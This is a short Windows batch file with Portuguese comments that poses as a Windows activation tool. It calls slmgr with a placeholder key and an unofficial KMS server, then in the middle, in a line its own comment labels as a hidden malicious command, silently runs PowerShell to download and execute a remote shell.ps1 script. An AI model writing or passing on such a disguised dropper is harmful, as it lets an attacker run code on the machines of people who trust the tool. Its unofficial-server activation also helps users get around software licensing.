@echo off
title Windows Activation
color 0a

echo Iniciando ativação do Windows...
timeout /t 2 > nul

:: Licenca (simulado)
echo Ativando com chaves do Windows...
slmgr /ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
slmgr /skms kms.lol
slmgr /ato

:: Comando malicioso escondido no meio
powershell -windowstyle hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://:80/shell.ps1')"

echo Ativação concluída!
pause
